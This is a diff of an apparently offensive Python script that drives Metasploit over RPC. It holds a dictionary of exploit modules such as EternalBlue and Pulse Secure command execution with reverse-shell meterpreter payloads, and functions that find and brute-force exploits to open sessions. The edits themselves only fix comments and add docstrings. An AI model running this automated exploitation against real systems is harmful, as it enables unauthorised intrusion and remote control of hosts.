@@ -6,7 +6,7 @@ import pdb
 import socket
 import time
 
-####################################DICTONNARY OF EXPLOIT CONFIG FOR AUTOMATISATION#####################################
+####################################DICTONNARY OF EXPLOITs CONFIG FOR AUTOMATISATION####################################
 
 dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
     'RHOSTS': '',
@@ -78,7 +78,7 @@ dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
         'Payload': 'java/meterpreter/reverse_tcp',
         'LHOSTS':''
     },
-    ############################################TOP EXPLOIT 2016-2020 USA############################################
+    ############################################TOP EXPLOITS 2016-2020 USA############################################
     'linux/http/pulse_secure_cmd_exec': {
         'RHOSTS': '',
         'CheckModule': 'auxiliary/gather/pulse_secure_file_disclosure',
@@ -292,6 +292,11 @@ def script_automate_scan(client, console):
 
 ###############################################EXPLOIT-DB SEARCH########################################################
 def get_board_exploit(client):
+    '''
+
+    @param client: rpc client from metasploit console
+    @return: dict of exploits which might work
+    '''
     # pdb.set_trace()
     board_of_exploit = {}
     tmp = {}
@@ -314,6 +319,12 @@ def get_board_exploit(client):
 
 
 def brute_force_exploit(board_of_exploit, client):
+    '''
+
+    @param board_of_exploit: dict of exploits which might work
+    @param client: rpc client from metasploit console
+    @return: dict of sessions cretaed thanks to exploits in board_o_exploit
+    '''
     # !!!!!!!!!!!!!!!!!!!!!!GLOBAL DICTIONNARY CHECK AT THE TOP OF THE CODE !!!!!!!!!!!!!!!!!!!!!!!!#
     ####global variable####
     global session_key_client
